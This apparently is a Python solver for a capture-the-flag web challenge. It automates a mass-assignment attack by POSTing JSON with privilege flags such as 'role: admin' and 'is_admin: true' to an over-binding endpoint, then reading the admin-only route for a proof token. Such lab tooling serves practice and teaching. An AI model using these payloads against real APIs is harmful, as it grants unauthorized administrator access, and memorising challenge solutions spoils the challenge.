"""D23 "Posted Too Much" (web-exploitation-day-13): mass assignment / over-binding DTO.

/api/clues = {framework, feature_route, secondary_route, current_role}. GET feature_route -> 405 post_required; POST
JSON to it binds every property it is handed (only display_name is echoed). Bind the privilege flags, then GET
secondary_route (403 administrator_required before) -> {"effect":"bound_privileged_property","evidence":"proof_..."}.
State is server-side per target (no cookie).
"""
import json
import urllib.parse

from lib import websolve

KEY_MAP = [(r"^current_role$|mass_?assign|over_?bind|bind|dto", "day23_web_posted_too_much")]

_PAYLOADS = (
    {"display_name": "bob", "name": "bob", "role": "admin", "is_admin": True, "admin": True, "isAdmin": True},
    {"display_name": "bob", "name": "bob", "role": "administrator", "is_admin": True, "admin": True,
     "isAdmin": True, "is_administrator": True, "administrator": True},
)


def _proof(body):
    return websolve.proof(body) if websolve.PROOF_RE.search(body or "") else None


def exploit(base, clues):
    j = clues if isinstance(clues, dict) else {}
    feat, sec = j.get("feature_route"), j.get("secondary_route")
    if not (isinstance(feat, str) and isinstance(sec, str)):
        return None
    fu, su = urllib.parse.urljoin(base, feat), urllib.parse.urljoin(base, sec)
    st, body, _ = websolve.fetch(fu)
    if st != 405 and "post_required" not in body:   # not the POST-binding DTO class
        return None
    for p in _PAYLOADS:
        _, body, _ = websolve.fetch(fu, data=json.dumps(p).encode(), method="POST",
                                    headers={"Content-Type": "application/json"})
        if _proof(body):
            return _proof(body)
        _, body, _ = websolve.fetch(su)
        if _proof(body):
            return _proof(body)
    return None


HANDLERS = {"day23_web_posted_too_much": exploit}
